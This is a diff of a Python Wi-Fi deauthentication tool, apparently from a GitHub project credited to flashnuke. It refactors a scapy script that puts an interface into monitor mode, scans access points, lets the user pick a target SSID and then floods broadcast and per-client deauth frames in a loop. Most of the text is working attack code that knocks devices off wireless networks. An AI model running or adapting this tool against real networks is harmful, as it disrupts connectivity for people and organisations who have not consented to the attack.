@@ -1,11 +1,10 @@
 #!/usr/bin/env python3
 
-import argparse
 import copy
-
-import pkg_resources
-import traceback
 import logging
+import argparse
+import traceback
+import pkg_resources
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
 
@@ -27,15 +26,10 @@ conf.verb = 0
 #   Ⓒ by https://github.com/flashnuke Ⓒ................................................................................
 #   --------------------------------------------------------------------------------------------------------------------
 
-class Interceptor:
-    _BROADCAST_MACADDR = "ff:ff:ff:ff:ff:ff"
-    _NON_OVERLAPPING_CHANNELS = {1, 6, 11,  # 2.4GHz
-                                 36, 40, 44, 48, 52, 54, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 140, 144,
-                                 149, 153, 157, 161, 165}  # 5GHz
 
-    def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager, all_channels, *args, **kwargs):
+class Interceptor:
+    def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager):
         self.interface = net_iface
-        self._all_channels = all_channels
         self._channel_sniff_timeout = 2
         self._scan_intv = 0.1
         self._deauth_intv = 0.1
@@ -48,7 +42,7 @@ class Interceptor:
 
         self.attack_loop_count = 0
 
-        self.target_ssid = dict()  # ssid stats
+        self.target_ssid: Union[SSID, None] = None
 
         if not skip_monitor_mode_setup:
             print_info(f"Setting up monitor mode...")
@@ -65,8 +59,7 @@ class Interceptor:
                 print_error(f"Failed to kill NetworkManager...")
 
         self._channel_range = {channel: defaultdict(dict) for channel in self._get_channels()}
-        self._all_5ghz_aps = defaultdict(dict)
-        self._all_24ghz_aps = defaultdict(dict)
+        self._all_ssids: Dict[BandType, Dict[str, SSID]] = {band: dict() for band in BandType}
 
     def _enable_monitor_mode(self):
         for cmd in [f"sudo ip link set {self.interface} down",
@@ -88,36 +81,25 @@ class Interceptor:
         self._current_channel_num = ch_num
 
     def _get_channels(self) -> List[int]:
-        all_channels = [int(channel.split('Channel')[1].split(':')[0].strip())
-                        for channel in os.popen(f'iwlist {self.interface} channel').readlines()
-                        if 'Channel' in channel and 'Current' not in channel]
-        return [ch for ch in all_channels if ch in Interceptor._NON_OVERLAPPING_CHANNELS or self._all_channels]
-
-    @staticmethod
-    def _freq_to_ch(freq):
-        base = 5000 if freq // 1000 == 5 else 2407
-        return (freq - base) // 5
+        return [int(channel.split('Channel')[1].split(':')[0].strip())
+                for channel in os.popen(f'iwlist {self.interface} channel').readlines()
+                if 'Channel' in channel and 'Current' not in channel]
 
     def _ap_sniff_cb(self, pkt):
         try:
             if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                 ap_mac = str(pkt.addr3)
                 ssid = pkt[Dot11Elt].info.strip(b'\x00').decode('utf-8').strip() or ap_mac
-                pkt_freq = pkt[RadioTap].Channel
-                pkt_ch = self._freq_to_ch(pkt_freq)
-                if ap_mac == self._BROADCAST_MACADDR or not ssid:
+                if ap_mac == BD_MACADDR or not ssid:
                     return
-                if pkt_ch > 14:  # is 5GHz
-                    if ssid not in self._all_5ghz_aps:
-                        self._all_5ghz_aps[ssid] = self._init_ap_dict(ap_mac)
-                    self._all_5ghz_aps[ssid]["all_channels"].append(pkt_ch)
-                else:
-                    if ssid not in self._all_24ghz_aps:
-                        self._all_24ghz_aps[ssid] = self._init_ap_dict(ap_mac)
-                    self._all_24ghz_aps[ssid]["all_channels"].append(pkt_ch)
+                pkt_ch = frequency_to_channel(pkt[RadioTap].Channel)
+                band_type = BandType.T_50GHZ if pkt_ch > 14 else BandType.T_24GHZ
+                if ssid not in self._all_ssids[band_type]:
+                    self._all_ssids[band_type][ssid] = SSID(ssid, ap_mac, band_type)
+                self._all_ssids[band_type][ssid].add_channel(pkt_ch)
             else:
                 self._clients_sniff_cb(pkt)  # pass forward to find potential clients
-        except:
+        except Exception as exc:
             pass
 
     def _scan_channels_for_aps(self):
@@ -128,40 +110,32 @@ class Interceptor:
                            f"out of {len(self._channel_range)})", end="\r")
                 sniff(prn=self._ap_sniff_cb, iface=self.interface, timeout=self._channel_sniff_timeout)
         except KeyboardInterrupt:
-            printf(f"{DELIM}")
-            print_error(f"User asked to stop, quitting...")
-            exit(0)
+            self.user_abort()
         finally:
             printf("")
 
-    def _start_initial_ap_scan(self) -> dict:
+    def _start_initial_ap_scan(self) -> SSID:
         print_info(f"Starting AP scan, please wait... ({len(self._channel_range)} channels total)")
 
         self._scan_channels_for_aps()
-        for ap_range in [self._all_24ghz_aps, self._all_5ghz_aps]:
-            for ssid_name, ssid_stats in ap_range.items():
-                all_ap_channels = sorted(list(set(ssid_stats['all_channels'])))
-                ch_med = all_ap_channels[len(all_ap_channels) // 2] if len(all_ap_channels) > 1 else all_ap_channels[0]
-                self._channel_range[ch_med][ssid_name] = copy.deepcopy(ssid_stats)
-                self._channel_range[ch_med][ssid_name]['channel'] = ch_med
+        for _, band_ssids in self._all_ssids.items():
+            for ssid_name, ssid_obj in band_ssids.items():
+                self._channel_range[ssid_obj.channel][ssid_name] = copy.deepcopy(ssid_obj)
+
+        pref = '[   ] '
+        printf(f"{DELIM}\n"
+               f"{pref}{self._generate_ssid_str('SSID Name', 'Channel', 'MAC Address', len(pref))}")
 
         ctr = 0
-        target_map = dict()
-        printf(DELIM)
-        pref = '[   ] '
-        printf(f"{pref}{self._generate_ssid_str('SSID Name', 'Channel', 'MAC Address', len(pref))}")
-
+        target_map: Dict[int, SSID] = dict()
         for channel, all_channel_aps in sorted(self._channel_range.items()):
-            for ssid, ssid_stats in all_channel_aps.items():
-                if not ssid or not ssid_stats:
-                    continue
+            for ssid_name, ssid_obj in all_channel_aps.items():
                 ctr += 1
-                target_map[ctr] = copy.deepcopy(ssid_stats)
-                target_map[ctr]['ssid'] = ssid
+                target_map[ctr] = copy.deepcopy(ssid_obj)
                 pref = f"[{str(ctr).rjust(3, ' ')}] "
                 preflen = len(pref)
                 pref = f"[{BOLD}{PURPLE}{str(ctr).rjust(3, ' ')}{RESET}] "
-                printf(f"{pref}{self._generate_ssid_str(ssid, ssid_stats['channel'], ssid_stats['mac_addr'], preflen)}")
+                printf(f"{pref}{self._generate_ssid_str(ssid_obj.name, ssid_obj.channel, ssid_obj.mac_addr, preflen)}")
         if not target_map:
             print_error("Not APs were found, quitting...")
             self._abort = True
@@ -180,10 +154,10 @@ class Interceptor:
         try:
             if self._packet_confirms_client(pkt):
                 ap_mac = str(pkt.addr3)
-                if ap_mac == self.target_ssid["mac_addr"]:
+                if ap_mac == self.target_ssid.mac_addr:
                     c_mac = pkt.addr1
-                    if c_mac != self._BROADCAST_MACADDR and c_mac not in self.target_ssid["clients"]:
-                        self.target_ssid["clients"].append(c_mac)
+                    if c_mac != BD_MACADDR and c_mac not in self.target_ssid.clients:
+                        self.target_ssid.clients.append(c_mac)
         except:
             pass
 
@@ -201,17 +175,17 @@ class Interceptor:
         try:
             print_info(f"Starting de-auth loop...")
 
-            ap_mac = self.target_ssid["mac_addr"]
+            ap_mac = self.target_ssid.mac_addr
 
             rd_frm = RadioTap()
             deauth_frm = Dot11Deauth(reason=7)
             while not self._abort:
                 self.attack_loop_count += 1
                 sendp(rd_frm /
-                      Dot11(addr1=self._BROADCAST_MACADDR, addr2=ap_mac, addr3=ap_mac) /
+                      Dot11(addr1=BD_MACADDR, addr2=ap_mac, addr3=ap_mac) /
                       deauth_frm,
                       iface=self.interface)
-                for client_mac in self.target_ssid["clients"]:
+                for client_mac in self.target_ssid.clients:
                     sendp(rd_frm /
                           Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
                           deauth_frm,
@@ -228,38 +202,36 @@ class Interceptor:
 
     def run(self):
         self.target_ssid = self._start_initial_ap_scan()
-        print_info(f"Attacking target {self.target_ssid['ssid']}")
-        print_info(f"Setting channel -> {self.target_ssid['channel']}")
-        self._set_channel(self.target_ssid['channel'])
+        ssid_ch = self.target_ssid.channel
+        print_info(f"Attacking target {self.target_ssid.name}")
+        print_info(f"Setting channel -> {ssid_ch}")
+        self._set_channel(ssid_ch)
 
         for action in [self._run_deauther, self._listen_for_clients]:
             t = Thread(target=action, args=tuple(), daemon=True)
             t.start()
 
-        printf(DELIM)
-        printf("")
+        printf(f"{DELIM}\n")
         try:
             start = self.get_time()
             while not self._abort:
-                print_info(f"Target SSID{self.target_ssid['ssid'].rjust(80 - 15, ' ')}")
-                print_info(f"Channel{str(self.target_ssid['channel']).rjust(80 - 11, ' ')}")
-                print_info(f"MAC addr{self.target_ssid['mac_addr'].rjust(80 - 12, ' ')}")
+                print_info(f"Target SSID{self.target_ssid.name.rjust(80 - 15, ' ')}")
+                print_info(f"Channel{str(ssid_ch).rjust(80 - 11, ' ')}")
+                print_info(f"MAC addr{self.target_ssid.mac_addr.rjust(80 - 12, ' ')}")
                 print_info(f"Net interface{self.interface.rjust(80 - 17, ' ')}")
-                print_info(f"Confirmed clients{BOLD}{str(len(self.target_ssid['clients'])).rjust(80 - 21, ' ')}{RESET}")
+                print_info(f"Confirmed clients{BOLD}{str(len(self.target_ssid.clients)).rjust(80 - 21, ' ')}{RESET}")
                 print_info(f"Elapsed sec {BOLD}{str(self.get_time() - start).rjust(80 - 16, ' ')}{RESET}")
                 sleep(self._printf_res_intv)
                 clear_line(7)
         except KeyboardInterrupt:
-            printf(f"\n{DELIM}")
-            print_error(f"User asked to stop, quitting...")
+            print("")
+            self.user_abort()
 
-    @staticmethod
-    def _init_ap_dict(mac_addr: str) -> dict:
-        return {
-            "all_channels": list(),
-            "mac_addr": mac_addr,
-            "clients": list()
-        }
+    def user_abort(self):
+        self._abort = True
+        printf(f"{DELIM}")
+        print_error(f"User asked to stop, quitting...")
+        exit(0)
 
     @staticmethod
     def get_time():
@@ -288,9 +260,6 @@ if __name__ == "__main__":
                         default=False, dest="skip_monitormode", required=False)
     parser.add_argument('-k', '--kill', help='kill NetworkManager (might interfere with the process)',
                         action='store_true', default=False, dest="kill_networkmanager", required=False)
-    parser.add_argument('-a', '--all-channels', help="don't filter by overlapping channels (use only if you know what "
-                                                     "you're doing!)",
-                        action='store_true', default=False, dest="all_channels", required=False)
     pargs = parser.parse_args()
 
     invalidate_print()  # after arg parsing
